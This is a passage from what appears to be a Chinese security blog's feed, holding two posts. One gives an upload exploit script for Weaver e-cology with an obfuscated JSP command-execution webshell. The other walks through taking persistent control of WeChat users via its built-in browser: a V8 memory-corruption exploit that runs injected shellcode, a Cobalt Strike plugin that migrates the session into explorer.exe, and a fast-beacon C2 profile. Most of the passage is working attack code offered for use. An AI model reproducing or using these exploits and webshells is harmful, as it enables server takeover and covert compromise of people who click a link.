class="string">&#x27;.zip&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, compression=zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span>(<span class="params">urllist</span>):</span></span><br><span class="line">    file_zip()</span><br><span class="line">    print(<span class="string">&#x27;上传文件中&#x27;</span>)</span><br><span class="line">    urls = urllist + <span class="string">&#x27;/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp&#x27;</span></span><br><span class="line">    file = [(<span class="string">&#x27;file1&#x27;</span>, (mm+<span class="string">&#x27;.zip&#x27;</span>, <span class="built_in">open</span>(mm + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/zip&#x27;</span>))]</span><br><span class="line">    requests.post(url=urls,files=file,timeout=<span class="number">60</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    GetShellurl = urllist+<span class="string">&#x27;/cloudstore/&#x27;</span>+webshell_name1</span><br><span class="line">    GetShelllist = requests.get(url = GetShellurl)</span><br><span class="line">    <span class="keyword">if</span> GetShelllist.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">&#x27;利用成功webshell地址为:&#x27;</span>+GetShellurl)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;未找到webshell利用失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) == <span class="number">2</span>):</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        GetShell(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;python3 lgo.py http://xx.xx.xx.xx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!&#x3D;null)&#123;</span><br><span class="line">        BASE64Decoder decoder &#x3D; new BASE64Decoder();</span><br><span class="line">        Class rt &#x3D; Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU&#x3D;&quot;)));</span><br><span class="line">        Process e &#x3D; (Process)</span><br><span class="line">                rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw&#x3D;&#x3D;&quot;)), String.class).invoke(rt.getMethod(new</span><br><span class="line">                        String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ&#x3D;&#x3D;&quot;))).invoke(null, new</span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in &#x3D; e.getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;</span><br><span class="line">&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;</span><br><span class="line">&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 泛微 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于微信内置浏览器 达到持久控制</title>
      <link href="2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于微信内置浏览器-达到持久控制"><a href="#关于微信内置浏览器-达到持久控制" class="headerlink" title="关于微信内置浏览器 达到持久控制"></a>关于微信内置浏览器 达到持久控制</h1><h3 id="最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞"><a href="#最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞" class="headerlink" title="最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞"></a>最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞</h3><h3 id="但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权"><a href="#但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权" class="headerlink" title="但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权"></a>但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权</h3><h2 id="解决上述问题"><a href="#解决上述问题" class="headerlink" title="解决上述问题"></a>解决上述问题</h2><h3 id="1-加载自定义-malleable-C2配置文件-从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程"><a href="#1-加载自定义-malleable-C2配置文件-从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程" class="headerlink" title="1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程"></a>1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程</h3><h3 id="2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚"><a href="#2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚" class="headerlink" title="2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚"></a>2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚</h3><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="1-加载自定义-malleable-C2配置文件"><a href="#1-加载自定义-malleable-C2配置文件" class="headerlink" title="1.加载自定义 malleable C2配置文件"></a>1.加载自定义 malleable C2配置文件</h3><pre><code>https://github.com/threatexpress/malleable-c2</code></pre><h4 id="在此项目上找到你cs版本对应的配置文件，我这里用的4-0-各版本差别不大"><a href="#在此项目上找到你cs版本对应的配置文件，我这里用的4-0-各版本差别不大" class="headerlink" title="在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大"></a>在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大</h4><p>我们现在只需要修改心跳的设置为一秒<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A13.webp" alt="image"><br>也可以用我改好的</p><h4 id="下载地址-：-jquery-c2-4-0-profile"><a href="#下载地址-：-jquery-c2-4-0-profile" class="headerlink" title="下载地址  ： jquery-c2.4.0.profile"></a>下载地址  ： <a href="https://www.ailiqun.xyz/images/jquery-c2.4.0.profile">jquery-c2.4.0.profile</a></h4><h4 id="修改好后丢到服务端"><a href="#修改好后丢到服务端" class="headerlink" title="修改好后丢到服务端"></a>修改好后丢到服务端</h4><p>启动cobaltstrike时在最后面加上配置文件的名称就好<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A12.webp" alt="image"></p><h4 id="2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件"><a href="#2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件" class="headerlink" title="2.加载一个 Cobalt Strike automigrate自动迁移进程的插件"></a>2.加载一个 Cobalt Strike automigrate自动迁移进程的插件</h4><p>插件代码：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">on</span> <span class="string">beacon_initial</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">sub</span> <span class="string">callback</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="string">$regex</span> <span class="string">=</span> <span class="string">&#x27;(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+&#x27;</span><span class="string">;</span></span><br><span class="line">  <span class="string">$listener</span> <span class="string">=</span> <span class="string">&quot;test&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">if</span> <span class="string">($2</span>  <span class="string">ismatch</span> <span class="string">$regex)</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="string">$pid</span> <span class="string">=</span> <span class="string">matched()</span>[<span class="number">1</span>]<span class="string">;</span></span><br><span class="line">   <span class="string">$inject_pid</span> <span class="string">=</span> <span class="string">$pid;</span></span><br><span class="line">   <span class="string">if</span> <span class="string">(-is64</span> <span class="string">$1)</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="string">$arch</span> <span class="string">=</span> <span class="string">&quot;x64&quot;</span><span class="string">;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="string">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="string">$arch</span> <span class="string">=</span> <span class="string">&quot;x86&quot;</span><span class="string">;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="string">binject($1</span>, <span class="string">$pid</span>, <span class="string">$listener</span>, <span class="string">$arch);</span></span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="string">if($inject_pid</span> <span class="type">!=</span> <span class="string">beacon_info($1</span>,<span class="string">&quot;pid&quot;</span><span class="string">))</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="string">bps($1</span>, <span class="string">&amp;callback);</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="复制到本地保存成一个-cna文件使用cobaltstrike加载插件就可"><a href="#复制到本地保存成一个-cna文件使用cobaltstrike加载插件就可" class="headerlink" title="复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可"></a>复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A11.webp" alt="image"></p><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><h3 id="1-准备文件"><a href="#1-准备文件" class="headerlink" title="1.准备文件"></a>1.准备文件</h3><h4 id="新建一个监听器"><a href="#新建一个监听器" class="headerlink" title="新建一个监听器"></a>新建一个监听器</h4><h6 id="监听器名字一定要设置成test"><a href="#监听器名字一定要设置成test" class="headerlink" title="监听器名字一定要设置成test"></a>监听器名字一定要设置成test</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/jtq.webp" alt="image"></p><h4 id="生成一个shellcode"><a href="#生成一个shellcode" class="headerlink" title="生成一个shellcode"></a>生成一个shellcode</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A15.webp" alt="image"></p><p>这里的就是你的shellcode</p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A16.webp" alt="image"></p><h4 id="替换js代码里的shellcode"><a href="#替换js代码里的shellcode" class="headerlink" title="替换js代码里的shellcode"></a>替换js代码里的shellcode</h4><p>js代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG = <span class="literal">true</span>;</span><br><span class="line">IN_WORKER = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// run calc and hang in a loop</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [];<span class="comment">//shellcode替换成自己的 注意是x86的</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="number">0xdecaf0</span>) &#123;</span><br><span class="line">        not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    not_optimised_out |= <span class="number">0xff</span>;</span><br><span class="line">    not_optimised_out *= <span class="number">12</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g_array;</span><br><span class="line"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">    g_array[<span class="number">0</span>] = <span class="number">0x1dbabe</span> * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;c01db33f&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> this_ = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">this</span>.buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.buffer_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.page_buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.page_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.prevent_opt = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span><br><span class="line">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(<span class="number">0x1000</span>);</span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span><br><span class="line">    <span class="built_in">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="built_in">this</span>.page_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> &#125; &#125;);</span><br><span class="line">    cb(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="comment">// var array = null;</span></span><br><span class="line">            <span class="built_in">super</span>(</span><br><span class="line">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span><br><span class="line">                <span class="comment">// has just happened.</span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, <span class="string">&#x27;g&#x27;</span></span><br><span class="line">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span><br><span class="line">                <span class="comment">// JSArray.</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span><br><span class="line">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span><br><span class="line">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line">            g_array[<span class="number">8</span>] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try&#123;</span></span><br><span class="line">    <span class="keyword">var</span> derived_n = <span class="built_in">eval</span>(<span class="string">`(function derived_n(i) &#123;</span></span><br><span class="line"><span class="string">        if (i == 0) &#123;</span></span><br><span class="line"><span class="string">            return DerivedBase;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        class DerivedN extends derived_n(i-1) &#123;</span></span><br><span class="line"><span class="string">            constructor() &#123;</span></span><br><span class="line"><span class="string">                super();</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;<span class="string">&quot;this.a=0;&quot;</span>.repeat(tDerivedNCount)&#125;</span></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return DerivedN;</span></span><br><span class="line"><span class="string">    &#125;)`</span>);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="built_in">this</span>.buffer);</span><br><span class="line">    <span class="built_in">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.page_buffer.slot = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.setPtr = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.read32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.write32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="built_in">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.write8 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="built_in">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.setBytes = <span class="function"><span class="keyword">function</span> (<span class="params">addr, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oob = oobAccess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span><br><span class="line">    print(<span class="string">&#x27;[*] target_function at 0x&#x27;</span> + func_ptr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(<span class="string">&#x27;[*] code_addr at 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    print(<span class="string">&quot;start running&quot;</span>);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面生成的shellcode 替换到此处<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A14.webp" alt="image"></p><h4 id="创建一个html文件调用js"><a href="#创建一个html文件调用js" class="headerlink" title="创建一个html文件调用js"></a>创建一个html文件调用js</h4><pre><code>&lt;script src=&quot;test.js&quot;&gt;&lt;/script&gt;  test</code></pre><h3 id="2-搭建服务"><a href="#2-搭建服务" class="headerlink" title="2.搭建服务"></a>2.搭建服务</h3><h4 id="随便拿什么搭都可以-我直接用hfs搭建下"><a href="#随便拿什么搭都可以-我直接用hfs搭建下" class="headerlink" title="随便拿什么搭都可以 我直接用hfs搭建下"></a>随便拿什么搭都可以 我直接用hfs搭建下</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A17.webp" alt="image"></p><h3 id="测试上线与进程转移效果"><a href="#测试上线与进程转移效果" class="headerlink" title="测试上线与进程转移效果"></a>测试上线与进程转移效果</h3><p>可以看的会上线两个 beacon 基于微信的会话在浏览器关闭后即掉线<br><img 